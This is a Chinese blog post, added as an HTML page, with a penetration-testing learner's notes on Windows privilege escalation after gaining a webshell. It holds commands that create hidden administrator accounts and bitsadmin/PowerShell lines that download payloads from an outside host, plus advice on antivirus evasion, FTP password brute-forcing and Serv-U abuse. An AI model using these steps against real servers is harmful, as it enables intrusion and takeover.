@@ -1,0 +1,1308 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Ehiyor">
+    
+    <title>
+        
+            windows提权思路 |
+        
+        Ehiyor&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/hide.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"yxhhyy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Ehiyor's blog","author":"Ehiyor","avatar":"/images/1.jpg","logo":"/images/1.jpg","favicon":"/images/logo.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","links":"/links                  || fa-solid fa-link","about":"/about                  || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"この人生に誠実になって幸せに生きてください","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/yxhhyy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"渗透测试learner"},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"updated_datetime_icon":"fa-solid fa-arrows-rotate","reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"unpkg"},"pjax":{"enable":true},"footer":{"since":null,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/hide.css"],"js":[null]},"aplayerInject":{"enable":true,"per_page":true},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Ehiyor&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        windows提权思路
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/1.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Ehiyor</span>
+                                
+                                    <span class="author-badge">渗透测试learner</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-02-03 17:46:02</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-arrows-rotate"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Feb 03 2025 17:49:23 GMT+0800">2025-02-03 17:49:23</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%8F%90%E6%9D%83/">提权</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <blockquote>
+<p>我们通过各种漏洞拿到了shell，获取了webshell的权限就可以对网站进行任意修改，但是我们需要获取服务器的管理员权限，也就是系统权限，用户的权限分三种：</p>
+<ol>
+<li>网络服务用户权限</li>
+<li>webshell（对网站修改）</li>
+<li>系统权限（管理员权限 Windows_System Linux_root权限）</li>
+</ol>
+<p>想要拿到系统权限就需要进行提权</p>
+</blockquote>
+<blockquote>
+<p>通常脚本所处的权限：</p>
+<ul>
+<li>asp、php	网络服务用户</li>
+<li>aspx    普通用户权限，一般可以调用 cmd</li>
+<li>jsp    管理员权限（管理员运行的容器）</li>
+</ul>
+<p><strong>脚本所处的权限取决于运行容器的用户身份，就比如使用 phpstudy 搭建的站点就是 system 权限</strong></p>
+<p>假如说现在的网站一共有三个站点，一个是使用 IIS 搭建的 asp 的站点，一个是使用 Tomcat 搭建的 jsp 的站点，还有一个是使用 PHP 搭建的站点。然后我们通过 asp的脚本拿到了 IIS搭建的webshell，同时我们可以在连接之后访问到 Tomcat 的根目录以及 phpstudy 的根目录，同时具有写入权限，那我们就可以尝试将木马写入到这些容器的根目录，借助这种高权限的容器，我们就可以间接性的提权</p>
+</blockquote>
+<h1 id="提权之前的准备"><a class="markdownIt-Anchor" href="#提权之前的准备"></a> 提权之前的准备</h1>
+<h2 id="收集信息"><a class="markdownIt-Anchor" href="#收集信息"></a> 收集信息</h2>
+<p>然后就是收集信息，假如说我们拿到的网站 shell 是一个外网的网站，那我们就可以将 3389端口开放直接连接，但是如果是一个内网的 ip，那我们就需要使用 MSF 进行端口转发，当然也可以使用 <code>lcx</code>，因为我们可以访问到内网本质上是因为管理员使用了防火墙或者路由器进行了转发，比如我们访问了外网的一个地址（80端口），通过管理员所做的策略，转发到了内网的某一台主机上面，这样我们才可以访问到内网的一台主机上面，假如说这台内网的主机开启了 3389，但是路由器或者防火墙没有做映射的话，我们通过外网的 web 地址是无法访问到的，这个时候就需要使用 MSF 进行端口转发，将这个端口转发到公网的一个 VPS 上面，然后我们直接连接 VPS，就可以连接到内网的这台主机（使用 <code>portfwd</code>）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6378 -p 6379 -r 127.0.0.1  <span class="comment"># 将靶机上面的6379端口转发到本地的6378端口</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>还要看服务器的系统以及版本的位数（X64、X32）</p>
+</li>
+<li>
+<p>还可以查看一下系统的补丁情况，使用命令：<code>systeminfo</code> ，一般情况下 300 个补丁程序就是节点，多了我们就没有必要继续往下看了，我们可以多尝试在补丁上面寻找漏洞，有些补丁如果没有的话，那我们就可以利用相关的漏洞对目标进行攻击，下面这是我自己电脑的补丁，这是系统自己装的</p>
+<p><img lazyload alt="image" data-src="image-20250124114816073.png"></p>
+<p>所以像公司、企业里面，应该把防火墙都打开，不单单要把外网的防火墙打开，还要把内网的防火墙也打开，因为攻击者的攻击手段不单单只有扫描，还可以通过钓鱼拿到内网的一台主机然后进行内网的横向渗透，所以我们需要在内网把防火墙也打开</p>
+</li>
+<li>
+<p>查看一下服务器的安装软件情况以及防护软件情况</p>
+<p>可以查看一下进程：<code>tasklist</code>，看看进程里面运行着哪些服务软件，也可以看一下默认的安装目录，至于软件防护，也可以直接看看进程，找一下相关的防护软件</p>
+</li>
+<li>
+<p>端口情况</p>
+<p><code>netstat -an</code> 直接查看，这个时候就有人问了，为什么不直接在外网进行端口扫描，因为在防火墙打开的情况下，直接进行端口扫描得到的都是防火墙开放的端口，并不是真正的 web 服务器。那假如说我的 web 服务器就是开放到外网上面的，那扫描到的端口和我服务器开放的端口是否是一样的？其实也是不一样的，因为有些端口只是监听在内网上面或者 127.0.0.1 上面</p>
+<p>使用这条命令还可以看到很多内网链接，这个内网链接也很重要，因为一些大一点的机构网络都是 <strong>站库分离</strong> 的，很多时候我们拿到了 web 服务器，但是数据库并不在这里，这个时候我们就可以通过 <code>netstat</code> 看一下他链接的哪一台服务器，比如说连接的是地址为：<strong>192.168.19.123:3306</strong>，这说明连接的是内网的一个 mysql 数据库，或者是 1521 oracle数据库，所以这个可以便于我们发现更多的主机</p>
+<p>假如说我们现在的网段是：192.168.0.100，但是我们使用命令之后看到里面有其他网段的地址，比如说：192.168.1.200，这个属于是1网段的，这些都属于可以通过内网的一些路由器过去的网段，这样就可以找到内网当中的不同的网段</p>
+</li>
+<li>
+<p>支持脚本的情况</p>
+<p>假如说我们现在拿到的 webshell 是 asp 站点的，也就是 asp 后缀的，但是有些时候我们想在 asp 里面执行 cmd 没用，上传 cmd 也是无法执行的，这是因为他把相关的组件禁用了，但是这个只针对 asp，这个时候就可以尝试更换脚本，比如说：可以上传aspx 的脚本，因为 aspx 是可以调用系统的 cmd 的，当然也可以尝试上传 php脚本，如果 php的某些函数没有被禁用的话也是可以调用 cmd 的</p>
+</li>
+</ul>
+<h2 id="信息收集常用的命令"><a class="markdownIt-Anchor" href="#信息收集常用的命令"></a> 信息收集常用的命令</h2>
+<ul>
+<li><strong>Windows：</strong>
+<ul>
+<li><code>ipconfig /all</code> 查看当前IP</li>
+<li><code>net user</code> 查看当前服务器账号情况</li>
+<li><code>netstat -ano</code> 查看当前服务器端口开放情况</li>
+<li><code>ver</code> 查看当前服务器操作系统</li>
+<li><code>systeminfo</code> 查看当前服务器配置信息（补丁情况）</li>
+<li><code>tasklist /svc</code> 查看当前服务器进程情况</li>
+<li><code>taskkill -PID pid号</code> 结束某个 pid 号的进程</li>
+<li><code>taskkill /im qq.exe /f</code> 结束 qq 进程</li>
+<li><code>net user cracer cracer /add</code>  添加一个用户名为 cracer 密码为 cracer 的用户</li>
+<li><code>net localgroup administrators cracer /add</code> 将用户 cracer 添加到管理员组</li>
+<li><code>whoami</code> 查看当前操作用户（当前权限）</li>
+</ul>
+</li>
+<li><strong>Linux：</strong>
+<ul>
+<li><code>ls -al</code> 查看当前目录下的文件和文件夹</li>
+<li><code>pwd</code> 查看当前操作路径</li>
+<li><code>uname -a</code> 查看当前服务器内核信息</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="comment"># 查看系统账号</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看当前管理员组里面有哪些成员，也就是查看管理员账号</span></span><br><span class="line">query user <span class="comment"># 查看哪些账号在登录状态</span></span><br><span class="line">qwinsta <span class="comment"># 查看当前登录的用户会话，和query user作用一样，如果有一个不能用就用另一个代替</span></span><br></pre></td></tr></table></figure>
+<p><img lazyload alt="image" data-src="image-20250124122730466.png"><br>
+<img lazyload alt="image" data-src="image-20250124122812869.png"></p>
+<p>假如说我们想要查看这个用户的详细信息，就可以使用命令：<code>net user xxx</code> （<strong>xxx</strong> 就是账户名称），比如说：</p>
+<p><img lazyload alt="image" data-src="image-20250124122926371.png"></p>
+<p>这里就有一个小问题，我们怎么判断我们的用户是不是黑客在我们电脑创建的恶意用户？这个时候就可以使用这条命令，可以查看一下用户创建的时间，因为管理用户是和系统一起创建的，所以时间如果是近期就说明这个用户为恶意用户，当然也可以看一下用户是否被启用，如果有两个管理员账号，但是一个禁用一个启用也是正常的，比如我的就是，Administrator 用户就是禁用的</p>
+<p><img lazyload alt="image" data-src="image-20250124123329288.png"></p>
+<p>当我们拿到一个shell之后，一定要执行：<code>whoami</code>，这个命令是用来查看当前用户的身份的，并且在 Windows 以及 Linux 都是可以执行的，以此来判断现在的权限</p>
+<p><img lazyload alt="image" data-src="image-20250124165215076.png"><br>
+<img lazyload alt="image" data-src="image-20250124165433502.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off <span class="comment"># 放在脚本开头，用来关闭命令回显，将结果统一输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="comment">#########system info collection</span></span><br><span class="line">systeminfo</span><br><span class="line">ver</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">net localgroup administrators</span><br><span class="line">net usér guest</span><br><span class="line">net user administrator</span><br><span class="line"><span class="built_in">echo</span> <span class="comment">#######at- with atqi#####</span></span><br><span class="line"><span class="built_in">echo</span> schtask /query</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="comment">####task-list##HHHHHHHEH HHH</span></span><br><span class="line">tasklist /svc</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="comment">####net-work infomation</span></span><br><span class="line">ipconfig/all</span><br><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br><span class="line">netstat -anipconfig /displaydns</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="comment">######H Services Hatt</span></span><br><span class="line">sc query <span class="built_in">type</span>= service state= all</span><br><span class="line"><span class="built_in">echo</span> <span class="comment">#######file ##teHteHeeeeee</span></span><br><span class="line"><span class="built_in">cd</span>\</span><br><span class="line">tree -F</span><br></pre></td></tr></table></figure>
+<p>然后就是对上述脚本中提取的命令和操作的解释：</p>
+<ol>
+<li><strong>系统信息收集</strong>：
+<ul>
+<li><code>systeminfo</code>：查看系统配置信息。</li>
+<li><code>ver</code>：查看操作系统版本。</li>
+<li><code>hostname</code>：查看主机名。</li>
+</ul>
+</li>
+<li><strong>用户和组信息</strong>：
+<ul>
+<li><code>net user</code>：查看用户账户信息。</li>
+<li><code>net localgroup</code>：查看本地组信息。</li>
+<li><code>net localgroup administrators</code>：查看管理员组成员。</li>
+<li><code>net usér guest</code>：查看Guest用户信息（注意拼写错误，应为<code>net user guest</code>）。</li>
+<li><code>net user administrator</code>：查看Administrator用户信息。</li>
+</ul>
+</li>
+<li><strong>计划任务</strong>：
+<ul>
+<li><code>schtask /query</code>：查看计划任务。</li>
+</ul>
+</li>
+<li><strong>进程信息</strong>：
+<ul>
+<li><code>tasklist /svc</code>：查看当前进程及其服务信息。</li>
+</ul>
+</li>
+<li><strong>网络信息</strong>：
+<ul>
+<li><code>ipconfig /all</code>：查看详细的网络配置。</li>
+<li><code>route print</code>：查看路由表。</li>
+<li><code>arp -a</code>：查看ARP表。</li>
+<li><code>netstat -an</code>：查看网络连接状态以及开放的端口。</li>
+<li><code>ipconfig /displaydns</code>：查看DNS缓存。</li>
+</ul>
+</li>
+<li><strong>服务信息</strong>：
+<ul>
+<li><code>sc query type= service state= all</code>：查看所有服务状态。</li>
+</ul>
+</li>
+<li><strong>文件系统信息</strong>：
+<ul>
+<li><code>cd\</code>：切换到根目录。</li>
+<li><code>tree -F</code>：以树状结构显示目录内容。</li>
+</ul>
+</li>
+</ol>
+<h2 id="下载文件到服务器"><a class="markdownIt-Anchor" href="#下载文件到服务器"></a> 下载文件到服务器</h2>
+<p>在拿到 shell 之后，可以利用下面这些命令进行自动化文件下载任务，下载一些恶意文件，但是记得做免杀，可以尝试使用 CS的一些脚本或者是 ps1 的脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfern http://www.cracer.com/shell.exe d:\shell.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>bitsadmin</code> 是一个 Windows 命令行工具，用于创建、管理和监视下载或上传作业</li>
+<li><code>/transfern</code> 是创建一个新的下载作业。</li>
+<li><code>http://www.cracer.com/shell.exe</code> 是要下载的文件 URL</li>
+<li><code>d:\shell.exe</code> 是文件下载后保存的路径和文件名。</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object system.net.webclient).DownloadFile(<span class="string">&#x27;http://www.cracer.com/x.exe&#x27;</span>, x.exe<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>powershell</code> 是 Windows 的命令行 shell 和脚本语言</li>
+<li><code>(new-object system.net.webclient)</code> 创建一个新的 WebClient 对象，用于从 Web 服务器下载数据</li>
+<li><code>.doanloadfile('http://www.cracer.com/x.exe', x.exe')</code> 是调用 WebClient 对象的 DownloadFile 方法，从指定的 URL 下载文件并保存为<code>x.exe</code></li>
+</ul>
+<p>除了上面这种方法，我们还可以使用 <code>nc</code> 来上传文件，如果检测的比较严格的话，我们可以尝试更改文件后缀来进行上传，比如说：我们想要上传一个 <code>cmd.exe</code>，但是很明显，这个大概率会被拦截，这个时候，我们就可以将后缀修改为<code>.jpg</code>、<code>.aaa</code>等等等等，并且我们调用的时候是可以直接调用修改之后的文件的，虽然文件的后缀被修改了，但是 windows 是可以识别文件的 PE 结构的，所以就算后缀名被修改了，我们依旧可以直接调用。</p>
+<p>然后就是使用 <strong>nc</strong> 上传文件的方法：</p>
+<ul>
+<li>
+<p>在接收端（服务器）：</p>
+<p><strong>启动 <code>nc</code> 监听端口并准备接收文件</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234 &gt; received_file</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-l</code>：让 <code>nc</code> 监听指定端口。</li>
+<li><code>-p 1234</code>：指定监听的端口号（这里以 1234 为例）。</li>
+<li><code>&gt; received_file</code>：将接收到的数据保存到 <code>received_file</code> 文件中。</li>
+</ul>
+</li>
+<li>
+<p>在发送端（客户端）：</p>
+<p><strong>使用 <code>nc</code> 发送文件</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;服务器IP&gt; 1234 &lt; file_to_send</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>&lt;服务器IP&gt;</code>：替换为接收端服务器的 IP 地址。</li>
+<li><code>1234</code>：与接收端监听的端口号一致。</li>
+<li><code>&lt; file_to_send</code>：指定要发送的文件。</li>
+</ul>
+</li>
+<li>
+<p>示例：</p>
+<p>假设服务器 IP 是 <code>192.168.1.100</code>，文件名为 <code>example.txt</code>。</p>
+<ul>
+<li>
+<p><strong>在服务器上</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234 &gt; example.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><strong>在客户端上</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.100 1234 &lt; example.txt</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="上马连接执行命令"><a class="markdownIt-Anchor" href="#上马连接执行命令"></a> 上马连接执行命令</h2>
+<p>当我们连接到目标之后，准备调用系统的 cmd 查看一下相关信息的时候，执行命令之后弹出：</p>
+<p><img lazyload alt="image" data-src="image-20250124172832258.png"></p>
+<blockquote>
+<p>这说明我们的 cmd 是无法执行的，那可能的原因是什么？</p>
+<ol>
+<li>防护软件拦截</li>
+<li>cmd 被降权</li>
+<li>组件被删除</li>
+<li>虚拟主机无 cmd 调用</li>
+</ol>
+<p>然后就是解决方案：</p>
+<ul>
+<li>
+<p>找可读写目录上传 cmd.exe，将执行的 cmd.exe 路径替换成上传的路径，再次调用执行。</p>
+</li>
+<li>
+<p>如果实在不行的话，就可以考虑更换脚本 /aspx/php</p>
+</li>
+</ul>
+</blockquote>
+<p>这个时候我们就可以找一个具有<strong>可写权限</strong>的目录，然后上传一个<code>cmd.exe</code>文件，然后使用我们新上传的 <code>cmd.exe</code> 文件执行命令</p>
+<p><img lazyload alt="image" data-src="image-20250124173148278.png"><br>
+<img lazyload alt="image" data-src="image-20250124173234229.png"></p>
+<p>这里我们上传一个大一点的 <code>aspx</code> 的木马，这种一般连上之后的权限都很高，我们上传之后依旧调用系统的 cmd 来执行命令，可以看到命令成功执行，这就说明刚刚是被降权了</p>
+<p><img lazyload alt="image" data-src="image-20250124173709613.png"></p>
+<h2 id="查找-3389"><a class="markdownIt-Anchor" href="#查找-3389"></a> 查找 3389</h2>
+<ol>
+<li>注册表读取</li>
+<li>工具扫描</li>
+<li>命令探针</li>
+</ol>
+<h1 id="windows-提权"><a class="markdownIt-Anchor" href="#windows-提权"></a> Windows 提权</h1>
+<h2 id="利用应用程序提权"><a class="markdownIt-Anchor" href="#利用应用程序提权"></a> 利用应用程序提权</h2>
+<p>常见的服务器程序：</p>
+<ul>
+<li>
+<p><strong>FTP软件</strong>：</p>
+<ul>
+<li>Server-U</li>
+<li>g6ftp</li>
+<li>FileZilla</li>
+</ul>
+</li>
+<li>
+<p><strong>远程管理软件</strong>：</p>
+<ul>
+<li>PCanywhere</li>
+<li>Radmin</li>
+<li>VNC</li>
+</ul>
+</li>
+</ul>
+<p>一般情况下，这种使用第三方软件搭建的 FTP 服务，都有测试账号，并且 <strong>账密大概率都是一样的</strong> ，这个时候就可以尝试使用弱口令进行爆破：<code>ftp、test、ceshi</code>，反正是可以找到的都可以试试，同时，这种账号的权限非常大</p>
+<h3 id="server-u-提权"><a class="markdownIt-Anchor" href="#server-u-提权"></a> Server-U 提权</h3>
+<p>假如我们使用 <strong>ftp</strong> 连接到了目标，然后就可以执行命令来创建一个用户，并且将其放到管理员组：<code>quote site exec net user a a /add</code> <code>quote site exec net user localgroup administrators a /add</code></p>
+<p>然后我们看一下得到的密码的格式：</p>
+<p><img lazyload alt="image" data-src="image-20250124182800893.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cqDEBBBFD7E64EBD64B91728F764499580 <span class="comment"># 密码</span></span><br><span class="line">cqtest</span><br></pre></td></tr></table></figure>
+<p>将后面的<code>DEBBBFD7E64EBD64B91728F764499580</code>进行 md5 解密之后得到 <code>test</code>，然后前面的<code>cq</code>就是盐，我们使用这个加密得到结果之后在前面加上解密用的盐，然后盐和密文使用大小写区分开来</p>
+<p>然后还有一种提权方法就是使用 Serv-U FTP，我们可以借助他的管理员账密创建一个新的 FTP 账号，并且这个账号是具有 System权限的，至于这里的系统口令，也就是密码，如果没有被修改就可以直接用，但是如果被修改了的话，我们可以找到<code>ServUAdmin.exe</code>文件，然后使用十六进制的工具，比如 010 打开，然后查找账号，后面跟着的就是密码</p>
+<p><img lazyload alt="image" data-src="image-20250124183541838.png"><br>
+<img lazyload alt="image" data-src="image-20250124184057062.png"></p>
